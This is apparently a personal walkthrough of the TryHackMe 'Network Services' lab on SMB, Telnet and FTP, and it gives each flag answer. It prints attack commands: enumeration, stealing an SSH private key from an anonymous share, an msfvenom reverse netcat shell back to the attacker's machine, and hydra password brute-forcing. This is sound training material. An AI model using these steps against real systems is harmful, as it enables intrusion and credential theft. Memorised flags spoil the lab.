# TryHackMe Network Services
#TryHackMe #SMBT #Telnet #FTP

## SMB
1. What is SMB?
	SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network, the smb is known as a response-request protocol
	
	- What does SMB stand for
		Server Message Block 
	- What type of protocol is SMB?
		response-request
	- What do clients connect to servers using
		tcp/ip
	- What systems does samba run on?
		Unix
2. Enumerating SMB
	- Conduct an nmap scan of your choosing, How many ports are open?
		`nmap -sC -sV IP_HERE`
		**3**
	- What ports is SMB running on?
		`139/445`
	- Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?
		`enum4linux IP_HERE`
		**WORKGROUP**
	- What comes up as the name of the machine?
		**POLOSMB**
	- What operating system version is running?
		**6.1**
	- What share sticks out as something we might want to investigate?
		**Profiles**
3. Exploiting SMB
	We can remotely access the SMB share using the syntax:
		smbclient //[IP]/[SHARE]
		Followed by the tags:
		-U [name] : to specify the user
		-p [port] : to specify the port
	What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
	 	*smbclient//10.10.10.2/secret -u suit*
	Login anonymously on smbclient by typing
		`smbclient //10.10.242.205/Profiles -u Anonymous`
	Does the share allow anonymous access? Y/N?
		*Y*
	Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? 
	 	`get "Working From Home Information.txt`
	 	*John Cactus*
	What service has been configured to allow him to work from home?
	 	*ssh*
	Okay! Now we know this, what directory on the share should we look in?
	  	*.ssh*
	This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
	  	*id_rsa*
	What is the smb.txt flag?
		`get id_rsa`
		`chmod 600 id_rsa`
		`ssh -i id_rsa cactus@IP_HERE`
		*THM{smb_is_fun_eh?}*
4. Understanding Telnet
	- What is Telnet?    
		*Application Protocol*
	- What has slowly replaced Telnet?    *SSH*
	-  How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
		*telnet 10.10.10.3 23*
	-  The lack of what, means that all Telnet communication is in plaintext?
		*Encryption*
	5. Enumerating Telnet
		- How many ports are open on the target machine?    
			`sudo nmap -sC -sV -p- IP_HERE`
			*1*
		- What port is this?
			8012
		- This port is unassigned, but still lists the protocol it's using, what protocol is this?
			*tcp*
		- Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
			*0*
		- Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage. 
		-  Based on the title returned to us, what do we think this port could be used for?
			`telnet IP_HERE 8012`
			*a backdoor*
		-  Who could it belong to? Gathering possible usernames is an important step in enumeration.
			*Skidy*
	6. Exploiting telnet 
		- Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
			`telnet IP_HERE 8012`
		- Great! It's an open telnet connection! What welcome message do we receive? 
			*SKIDY'S BACKDOOR.*
		- Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
			*N*
		- Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. 
			`sudo tcpdump ip proto \\icmp -i tun0`
		- Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
			`.RUN ping TUN0_IP_HERE -c 1`
			*Y*
		- Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
			`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
		- What word does the generated payload start with?
			*mkfifo*
		- What would the command look like for the listening port we selected in our payload?
		 	`nc -lvp 4444`
		- What is the flag.txt?
			*THM{y0u_g0t_th3_t3ln3t_fl4g}*
7.  Understanding FTP
	- What communications model does FTP use?
		*client-server*
	- What's the standard FTP port?
		*21*
	- How many modes of FTP connection are there?    
		*2*
8. Enumerating FTP
	- How many ports are open on the target machine?  
		`sudo nmap -sC -sV -p- IP_HERE`
		*2*
	- What port is ftp running on?
		*21*
	- What variant of FTP is running on it? 
		*VSFTPD*
	- What is the name of the file in the anonymous FTP directory?
		`ftp IP_HERE 21`
		`Username: anonymous`
		`Password: `
		*PUBLIC_NOTICE.TXT*
	- What do we think a possible username could be?
		mike
9. Exploiting FTP
	- What is the password for the user "mike"?
		`hydra -l mike -P /usr/share/wordlists/rockyou.txt IP_HERE ftp`
		*password*
	- Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted
		`ftp IP_HERE 21`
		`USERNAME: mike`
		`Password: password`
	- What is ftp.txt?
		*THM{y0u_g0t_th3_ftp_fl4g}*